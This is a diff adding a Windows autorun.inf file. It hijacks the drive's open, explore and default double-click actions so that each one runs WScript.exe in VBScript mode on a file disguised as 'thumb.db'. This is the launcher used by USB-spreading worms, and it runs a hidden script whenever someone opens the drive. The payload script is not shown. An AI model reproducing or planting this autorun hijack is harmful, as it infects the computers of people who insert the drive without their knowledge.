@@ -1,0 +1,7 @@
+[autorun]
+open=WScript.exe //e:VBScript thumb.db auto
+shell\open=Open
+shell\open\Command=WScript.exe //e:VBScript thumb.db auto
+shell\open\Default=1
+shell\explore=Explore
+shell\explore\Command=WScript.exe //e:VBScript thumb.db auto
